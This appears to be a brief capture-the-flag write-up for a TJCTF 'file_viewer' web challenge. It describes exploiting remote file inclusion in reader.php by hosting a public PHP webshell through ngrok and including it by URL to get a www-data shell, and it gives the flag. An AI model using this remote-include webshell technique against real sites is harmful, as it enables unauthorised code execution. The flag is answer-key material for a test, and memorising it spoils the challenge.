@@ -1,0 +1,19 @@
+We get an page with files name and an input box.
+
+Its vulnerable to LFI and RFI .
+
+So lets try and get an shell !
+
+https://file_viewer.tjctf.org/reader.php?file=
+
+So lets port forward using ngrok http://ngrok.com
+
+> python -m SimpleHTTPServer 80 ./ngrok http 80
+
+We uploaded the following webshell : https://github.com/WhiteWinterWolf/wwwolf-php-webshell
+
+3] http://740010fe.ngrok.io/webshell.php
+
+We get an shell as www-data. Lets grab the flag :)
+
+FLAG : tjctf{l0CaL_f1L3_InCLUsi0N_is_bad}
